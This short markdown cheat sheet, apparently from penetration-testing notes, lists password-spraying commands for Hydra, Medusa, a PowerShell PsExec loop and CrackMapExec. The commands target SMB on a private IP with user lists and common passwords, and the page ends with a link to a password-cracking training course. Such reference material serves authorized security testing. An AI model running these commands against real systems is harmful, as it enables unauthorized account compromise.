# Password attacks

### Hydra

The below command will perform a password attack using a total of 2 attempts per username in the last.\
\
1\. -p \<password> = password\
2\. -e s = try the username as the password

```
hydra -L Common\ users\ list.txt -p Password1 -e s -V 192.168.95.11 smb
```

### Medusa

The below command will perform 1 password attack against each username in the list.

1. \-p \<password> = password

```
medusa -h 192.168.95.11 -U Common\ users\ list.txt -p Welcome1 -M smbnt -m GROUP:DOMAIN
```

### Powershell

```
ForEach ($file in (Get-Content "list.txt")) {write-host "Attempting user: $file" -ForegroundColor red ;.\PsExec.exe -u $file -p 'Password1' cmd.exe}
```

### Crackmapexec

```
crackmapexec smb targets.txt -u "username" -p "password" --local-auth
```

## Password cracking training

{% embed url="https://in.security/technical-training/password-cracking/" %}
